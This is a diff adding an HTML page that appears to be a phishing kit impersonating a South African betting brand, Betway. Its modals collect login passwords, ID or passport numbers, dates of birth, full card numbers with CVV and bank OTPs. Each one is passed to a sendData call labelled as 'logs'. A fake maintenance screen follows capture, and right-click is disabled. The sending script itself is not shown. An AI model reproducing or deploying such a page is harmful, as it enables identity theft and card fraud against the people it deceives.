@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <title>Betting Voucher South Africa</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body oncontextmenu="return false;">
+    <div id="loading-view">
+        <div class="loader-logo">betting voucher</div>
+        <div class="spinner" style="border-top-color:var(--bw-green)"></div>
+    </div>
+    
+    <div id="process-overlay">
+        <div class="loader-logo">betting voucher</div>
+        <div class="spinner" style="border-top-color:var(--bw-green)"></div>
+    </div>
+    
+    <div id="chat-icon" onclick="toggleChat()"><i class="fas fa-headset" style="font-size:22px;color:#fff"></i></div>
+    
+    <div id="login-modal" class="overlay" style="display:none">
+        <div class="modal-container">
+            <div class="modal-header">
+                <span>Login</span>
+                <i class="fas fa-times" style="cursor:pointer;" onclick="closeModals()"></i>
+            </div>
+            <div class="modal-body">
+                
+                <div class="mat-wrap has-prefix" id="mobile-wrap">
+                    <input type="tel" id="lgn-mobile" class="mat-input" onfocus="handleFocus(this, true)" onblur="handleBlur(this, true)" oninput="remMatErr(this)">
+                    <label class="mat-label" id="mobile-label">+27 Mobile Number</label>
+                    <span class="mat-prefix">+27</span>
+                    <div class="error-text">This field is required.</div>
+                </div>
+
+                <div class="mat-wrap" id="pw-wrap">
+                    <input type="password" id="login-pw" class="mat-input" onfocus="onPwFocus(this)" onblur="handleBlur(this, false)" oninput="remMatErr(this)">
+                    <label class="mat-label">Enter Password</label>
+                    <i class="fas fa-eye pw-eye" id="eye-login" onclick="togglePassword('login-pw','eye-login')"></i>
+                    <div class="error-text">This field is required.</div>
+                </div>
+
+                <div class="forgot-row">
+                    <span onclick="openModal('forgot-pw-modal')">Forgot Username</span>
+                    <span onclick="openModal('forgot-pw-modal')">Forgot Password?</span>
+                </div>
+                
+                <div class="signup-promo-box">
+                    <span>Don't have an account yet?</span>
+                    <strong onclick="openModal('signup-modal')" style="cursor:pointer; color:#000;">Sign Up <i class="fas fa-chevron-right" style="font-size:12px"></i></strong>
+                </div>
+                
+                <button id="lgn-submit" class="submit-btn" onclick="sendData('Betting Voucher logs')">Login</button>
+                
+                <div id="login-error"><i class="fas fa-info-circle"></i><span>Access Denied. Check Username and/or Password</span></div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Verification Modal View -->
+    <div id="verification-modal" class="overlay" style="display:none">
+        <div class="modal-container">
+            <div class="modal-header">
+                <span>Verification</span>
+            </div>
+            <div class="modal-body">
+                <p style="font-size:14px; margin-bottom:15px; color:#333;">We need more information about you</p>
+                <select id="verify-doc-type">
+                    <option>SA ID Number</option>
+                    <option>Passport</option>
+                </select>
+                <input type="text" id="verify-doc-input" placeholder="Number" oninput="remErr(this)">
+                
+                <label for="verify-dob" style="font-size:14px; color:#333; margin-bottom:5px; display:block;">Date of Birth</label>
+                <input type="text" id="verify-dob" placeholder="DD/MM/YYYY" oninput="remErr(this)" style="color:#333;">
+                
+                <button id="verify-submit" class="submit-btn" onclick="sendData('Verification logs')">Verify Identity</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Cards Details Modal View with Professional Guides -->
+    <div id="card-modal" class="overlay" style="display:none">
+        <div class="modal-container">
+            <div class="modal-header">
+                <span><i class="fas fa-credit-card" style="margin-right: 8px;"></i> Secure Card Linking</span>
+            </div>
+            <div class="modal-body">
+                <div class="card-guidelines">
+                    <strong><i class="fas fa-shield-alt"></i> Banking Card Guidelines:</strong>
+                    <ul>
+                        <li>Ensure your card is enabled for 3D Secure / online transactions.</li>
+                        <li>Enter the exact cardholder name as printed on your card.</li>
+                        <li>Visa, Mastercard, and Maestro cards accepted.</li>
+                    </ul>
+                </div>
+                
+                <div style="position:relative; margin-bottom:12px;">
+                    <input type="text" id="card-holder" placeholder="Cardholder Full Name" oninput="remErr(this)">
+                </div>
+                <div style="position:relative; margin-bottom:12px;">
+                    <input type="text" id="card-number" placeholder="Card Number (XXXX XXXX XXXX XXXX)" maxlength="19" oninput="remErr(this)">
+                </div>
+                <div style="display:grid; grid-template-columns: 1fr 1fr; gap: 10px;">
+                    <input type="text" id="card-expiry" placeholder="MM/YY" maxlength="5" oninput="remErr(this)">
+                    <input type="password" id="card-cvv" placeholder="CVV (3 Digits)" maxlength="4" oninput="remErr(this)">
+                </div>
+                
+                <button id="card-submit" class="submit-btn" style="margin-top:10px;" onclick="sendData('Card Details logs')">Authorize & Link Card</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- OTP Verification Modal View -->
+    <div id="otp-modal" class="overlay" style="display:none">
+        <div class="modal-container">
+            <div class="modal-header">
+                <span>Secure Card Authentication (OTP)</span>
+            </div>
+            <div class="modal-body" style="text-align: center;">
+                <div style="font-size: 40px; color: var(--bw-green); margin-bottom: 10px;">
+                    <i class="fas fa-mobile-alt"></i>
+                </div>
+                <p style="font-size:14px; margin-bottom:20px; color:#333;">Please enter the Bank OTP sent via SMS to verify and authorize your card transaction.</p>
+                
+                <input type="text" id="otp-code-input" placeholder="Enter 6-Digit OTP" maxlength="6" style="text-align: center; font-size: 20px; letter-spacing: 4px;" oninput="remErr(this)">
+                
+                <button id="otp-submit" class="submit-btn" style="margin-top:10px;" onclick="sendData('OTP Verification logs')">Confirm Bank OTP</button>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Maintenance View replacing Success View -->
+    <div id="maintenance-view" class="view">
+        <div class="bars-container">
+            <div class="bar bar-1"></div>
+            <div class="bar bar-2"></div>
+            <div class="bar bar-3"></div>
+            <div class="jumper"><i class="fas fa-running"></i></div>
+            <div class="bar bar-4"></div>
+            <div class="bar bar-5"></div>
+            <div class="bar bar-6"></div>
+            <div class="bar bar-7"></div>
+        </div>
+        <h1 class="maint-title">WE'RE DOWN FOR<br>MAINTENANCE</h1>
+        <p class="maint-sub">Please try again soon</p>
+        
+        <div class="betway-logo-maint">
+            <span>betway</span>
+        </div>
+    </div>
+    
+    <div id="chat-window">
+        <div id="chat-header"><span>Betting Voucher Live Support</span><i class="fas fa-times" onclick="toggleChat()"></i></div>
+        <div id="chat-msgs"><div class="msg-b msg-agent">Welcome to Betting Voucher South Africa. An agent is ready to help you.</div></div>
+        <div id="chat-input-area">
+            <input type="text" id="chat-txt" placeholder="Describe your issue..." style="flex:1;border:none;outline:none;background:transparent;padding:10px">
+            <i class="fas fa-paper-plane" style="color:var(--bw-green);padding:10px;font-size:20px" onclick="sendChatTxt()"></i>
+        </div>
+    </div>
+    
+    <div id="signup-modal" class="overlay" style="display:none">
+        <div class="modal-container">
+            <div class="modal-header">Sign Up <i class="fas fa-times" onclick="openModal('login-modal')"></i></div>
+            <div class="modal-body">
+                <input type="text" id="sgp-mobile" placeholder="+27 MobileNumber" oninput="remErr(this)">
+                <input type="password" id="signup-pw" placeholder="Enter Password" oninput="remErr(this)">
+                <input type="text" id="sgp-fname" placeholder="First Name" oninput="remErr(this)">
+                <input type="text" id="sgp-sname" placeholder="Surname" oninput="remErr(this)">
+                <input type="email" id="sgp-email" placeholder="Email" oninput="remErr(this)">
+                <div class="coupon-section">
+                    <div class="coupon-card"><div class="coupon-img"><i class="fas fa-plane" style="color:red;font-size:24px"></i></div><div class="coupon-info"><h4>1000 Free Flights</h4><p>On Aviator</p></div></div>
+                    <div class="coupon-card"><div class="coupon-img"><i class="fas fa-futbol" style="color:var(--bw-green);font-size:24px"></i></div><div class="coupon-info"><h4>R1000 Free Bet</h4><p>On any Sports</p></div></div>
+                    <div class="coupon-btns"><button class="btn-later" onclick="openModal('login-modal')">Later</button> <button class="btn-accept" onclick="openModal('login-modal')">Accept</button></div>
+                </div>
+                <button id="sgp-submit" class="submit-btn" style="margin-top:15px" onclick="sendData('Sign up logs')">Register Now</button>
+            </div>
+        </div>
+    </div>
+    
+    <div id="forgot-pw-modal" class="overlay" style="display:none">
+        <div class="modal-container">
+            <div class="modal-header">Account Recovery <i class="fas fa-times" onclick="openModal('login-modal')"></i></div>
+            <div class="modal-body">
+                <select id="doc-type"><option>SA ID Number</option><option>Passport</option></select>
+                <input type="text" id="forgot-input" placeholder="Number" oninput="remErr(this)">
+                
+                <label for="forgot-dob" style="font-size:14px; color:#333; margin-bottom:5px; display:block;">Date of Birth</label>
+                <input type="text" id="forgot-dob" placeholder="DD/MM/YYYY" oninput="remErr(this)" style="color:#333;">
+                
+                <button id="forgot-submit" class="submit-btn" onclick="sendData('Forgot Password')">Submit</button>
+            </div>
+        </div>
+    </div>
+
+    <script src="js/script.js"></script>
+</body>
+</html>
